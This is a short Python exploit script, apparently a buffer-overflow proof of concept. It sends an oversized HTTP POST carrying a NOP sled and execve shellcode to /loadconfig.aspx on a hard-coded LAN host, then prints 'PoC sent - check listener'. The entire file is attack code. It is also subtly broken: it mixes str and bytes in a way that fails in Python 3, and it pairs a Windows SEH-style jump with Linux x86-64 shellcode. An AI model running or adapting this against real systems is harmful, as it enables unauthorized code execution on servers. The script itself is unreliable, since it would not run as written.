#!/usr/bin/env python3
import socket
buffer = "A" * 6175 + b"\xeb\x11\x90\x90\x0c\x11\x0d\x1b" + b"\x90"*20
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
buffer += shellcode + b"D" * (10000 - len(buffer))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 80))
s.send(b"POST /loadconfig.aspx HTTP/1.1\r\nContent-Length: " + str(len(buffer)).encode() + b"\r\n\r\n" + buffer)
s.close()
print("PoC sent - check listener")
